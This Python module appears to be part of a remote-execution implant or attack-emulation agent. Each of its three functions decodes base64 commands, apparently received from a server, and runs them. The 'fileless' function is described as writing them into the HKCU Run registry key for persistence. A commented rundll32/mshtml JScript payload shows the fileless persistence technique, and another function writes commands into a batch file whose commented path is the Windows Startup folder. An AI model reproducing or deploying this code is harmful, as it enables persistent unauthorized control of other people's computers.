import os
import base64
from other import *
from global_header import *
import threading

# document_script= r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\DS_Startup.bat'
document_script = getFileName("documentscript")

def fileless(data):
    print("New Process Created: Parent id = " + str(os.getppid()) + ". Child id = " + str(os.getpid()) + ".")
    data = base64.b64decode(data)
    #data = r'"rundll32.exe javascript:\"\..\mshtml,RunHTMLApplication \";document.write(\"\74script language=jscript.encode^>\"+(new%20ActiveXObject(\"WScript.Shell\")).RegRead(\"HKCU\\software\\microsoft\\windows\\currentversion\\run\\\\\")+\"\74/script^>\")"'
    data = data.decode(encoding="utf-8")
    print("DEBUG: {}:{}:::Data received is '{}'".format(str(os.getppid()), str(os.getpid()), data))

# Adding registry for the fileless attack
# ==========================================
#     command = r"REG ADD HKCU\software\microsoft\windows\currentversion\run\ /f /ve /t REG_SZ /d " + data
    command = data
    print("DEBUG: {}:{}:::Command is '{}'".format(str(os.getppid()), str(os.getpid()), command))
    print("INFO: " + str(os.getppid()) + ":" + str(os.getpid()) + ":::" + "Adding registry to the location - HKCU\\software\\microsoft\\windows\\currentversion\\run.")
    execute_command(command)

    # if (pri_sock.send(b"Fileless Process Completed") < 0):
    #     print("ERROR::" + os.getppid() + ":" + os.getpid() + ":::Unable to send the status to the server")
    #     exit(1)
    print(str(os.getppid()) + ":" + str(os.getpid()) + ":::" + "Completing the process.")


def dbt(data):
    print("New Process Created: Parent id = " + str(os.getppid()) + ". Child id = " + str(os.getpid()) + ".")
    data = base64.b64decode(data)
    #data = r'"rundll32.exe javascript:\"\..\mshtml,RunHTMLApplication \";document.write(\"\74script language=jscript.encode^>\"+(new%20ActiveXObject(\"WScript.Shell\")).RegRead(\"HKCU\\software\\microsoft\\windows\\currentversion\\run\\\\\")+\"\74/script^>\")"'
    data = data.decode(encoding="utf-8")
    print("DEBUG: {}:{}:::Data received is '{}'".format(str(os.getppid()), str(os.getpid()), data))

    command = data
    print("INFO: " + str(os.getppid()) + ":" + str(os.getpid()) + ":::" + "Executing the DBT file.")
    t1 = threading.Thread(target=execute_command, args=('"{}"'.format(command),))
    t1.start()
    print(str(os.getppid()) + ":" + str(os.getpid()) + ":::" + "Completing the process.")


#========================================================

def documentsScript(data):
    print("INFO: New Process Created: Parent id = " + str(os.getppid()) + ". Child id = " + str(os.getpid()) + ".")
    command = base64.b64decode(data)
    command = command.decode(encoding="utf-8")
    print("INFO: Received command to execute: " + command)
    batchFile = batFile('docScripts', document_script, command)
    batchFile.batProcess()